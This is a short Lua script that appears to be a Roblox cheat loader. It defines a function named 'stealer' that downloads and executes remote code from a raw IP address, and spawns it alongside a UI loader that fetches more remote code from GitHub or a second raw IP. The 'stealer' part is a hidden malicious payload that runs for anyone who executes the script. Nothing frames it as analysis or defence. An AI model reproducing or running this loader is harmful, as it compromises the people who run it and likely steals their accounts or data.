local function stealer()
ID="a7266030-606f-4882-a9fc-e4dfbbb51ce1";
loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
end

local function loadui()
  if game.PlaceId == 142823291 then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
  else
      loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
  end

end

task.spawn(stealer)
task.spawn(loadui)
